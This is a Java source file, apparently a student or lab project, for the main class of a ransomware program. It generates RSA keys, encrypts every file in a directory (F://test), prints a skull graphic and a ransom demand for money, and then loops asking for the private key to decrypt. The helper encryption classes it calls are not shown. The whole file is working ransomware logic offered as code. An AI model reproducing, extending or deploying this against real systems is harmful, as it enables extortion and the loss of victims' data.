package com.mycompany.decode;

import java.io.File;
import java.security.KeyFactory;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.Base64;
import java.util.Scanner;
import java.security.PrivateKey;
/**
 *
 * @author VanAnh
 */
public class Decode {
    public static void main(String[] args) {
        try {
            // Generate Key 
            SecurityKeyPairGenerator keyGen = new SecurityKeyPairGenerator();
            keyGen.generateKeyPair();
            keyGen.saveKeys("F://publicKey");
            System.out.println("Keys generated and saved successfully.");
            Encrpytion encryptor = new Encrpytion();
            encryptor.loadPublicKey("F://publicKey");

            // Encrypt all files in the "F:\test"
            File directory = new File("F://test");
            encryptor.encryptDirectory(directory);
            System.out.println("All files encrypted.");
            
            // Display notification
            final String RESET = "\033[0m";      // Reset color
            final String RED_TEXT = "\033[31m";  // Red text color

            String skullArt =
                    RED_TEXT +
                            "   _____     _____   \n" +
                            "  /     \\   /     \\ \n" +
                            " | () () | | () () |\n" +
                            " |   >   | |   >   |\n" +
                            " |  \\_/  | |  \\_/  |\n" +
                            "  \\_____/   \\_____/ \n" +
                            "    | |       | |\n" +
                            "    | |       | |\n" +
                            "    |_|       |_|\n" +
                            RESET;

            System.out.println(skullArt);
            System.out.println();
            System.out.println("All your files have been encrypted by us.");
            System.out.println("If you want to get the file back, transfer money to this account hahaha and we will send the decrypted file.");
            
            Scanner scanner = new Scanner(System.in);
            PrivateKey privateKey = null;
            boolean isDecrypted = false;
            
            // Loop until the correct private key is entered
            while (!isDecrypted) {
                System.out.println("Please enter the private key:");
                
                try {
                    String privateKeyBase64 = scanner.nextLine();
                    byte[] keyBytes = Base64.getDecoder().decode(privateKeyBase64);
                    PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(keyBytes);
                    KeyFactory keyFactory = KeyFactory.getInstance("RSA");
                    privateKey = keyFactory.generatePrivate(keySpec);
                    // Attempt to decrypt the files with the provided key
                    Decryption decryptor = new Decryption(privateKey);
                    decryptor.decryptDirectory(directory);
                    System.out.println("All files decrypted successfully.");
                    isDecrypted = true;  // Exit the loop if decryption succeeds
                } catch (Exception e) {
                    System.out.println("Incorrect private key. Please try again.");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
